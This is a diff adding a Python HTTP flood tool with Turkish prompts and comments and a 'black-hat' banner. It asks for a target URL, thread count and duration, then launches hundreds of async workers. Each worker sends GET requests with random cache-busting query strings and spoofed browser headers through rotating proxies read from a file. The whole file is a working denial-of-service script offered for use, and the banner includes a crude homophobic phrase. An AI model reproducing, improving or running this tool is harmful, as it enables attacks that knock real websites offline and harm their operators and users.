@@ -1,0 +1,76 @@
+import asyncio
+import aiohttp
+from aiohttp_proxy import ProxyConnector
+import random
+import time
+import sys
+
+# ||PAUSE... NO HOMO|| - 2026 BLACK-HAT DEITY
+# THE TIMED OVERKILL: BYPASS + DURATION CONTROL
+
+def get_headers():
+    browsers = ["Chrome", "Firefox", "Safari", "Edge"]
+    os = ["Windows NT 10.0; Win64; x64", "X11; Linux x86_64", "Macintosh; Intel Mac OS X 10_15_7"]
+    headers = {
+        "User-Agent": f"Mozilla/5.0 ({random.choice(os)}) AppleWebKit/537.36 (KHTML, like Gecko) {random.choice(browsers)}/120.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "keep-alive",
+        "Cache-Control": "no-cache",
+        "Referer": "https://www.google.com/"
+    }
+    return headers
+
+async def attack_unit(target, proxy_list, end_time):
+    while time.time() < end_time:
+        proxy = random.choice(proxy_list)
+        connector = ProxyConnector.from_url(f"http://{proxy}")
+        
+        async with aiohttp.ClientSession(connector=connector) as session:
+            try:
+                # Cache-Busting Bypass: Her istek benzersiz!
+                bypass_url = f"{target}/?{random.randint(100, 9999)}={random.randint(100, 9999)}"
+                async with session.get(bypass_url, headers=get_headers(), timeout=4) as response:
+                    # Status logu çok terminal kasmasın diye sadece 200'leri basıyoruz
+                    if response.status == 200:
+                        print(f"[+] DARBE BAŞARILI | Proxy: {proxy[:12]}.. | Kalan Süre: {int(end_time - time.time())}s")
+            except:
+                pass
+
+async def main():
+    print("\n||PAUSE... NO HOMO|| - THUGNIFICENT V2 LOADING...")
+    print("--------------------------------------------------")
+    
+    # Girdi (Input) Bölümü
+    target = input("[?] HEDEF URL (Örn: http://hedef.com): ").strip()
+    threads = int(input("[?] THREAD SAYISI (Örn: 500-1000): "))
+    duration = int(input("[?] SALDIRI SÜRESİ (Saniye): "))
+    
+    # Proxy Yükleme
+    try:
+        with open("proxy.txt", "r") as f:
+            proxy_list = [line.strip() for line in f.readlines() if line.strip()]
+        print(f"[*] {len(proxy_list)} Adet Proxy Şarjörde.")
+    except FileNotFoundError:
+        print("[!] Hata: proxy.txt dosyası bulunamadı!")
+        return
+
+    print(f"\n[*] Operasyon Başlıyor: {duration} saniye boyunca cehennem ateşi!")
+    
+    end_time = time.time() + duration
+    tasks = []
+    
+    # Mermileri namluya sür
+    for _ in range(threads):
+        tasks.append(asyncio.create_task(attack_unit(target, proxy_list, end_time)))
+    
+    # Süre dolana kadar bekle
+    await asyncio.sleep(duration)
+    print("\n[#] SÜRE DOLDU. OPERASYON TAMAMLANDI. BLOCK SOĞUDU.")
+    sys.exit()
+
+if __name__ == "__main__":
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("\n[!] Manuel İptal Edildi. Mermiler geri çekiliyor.")
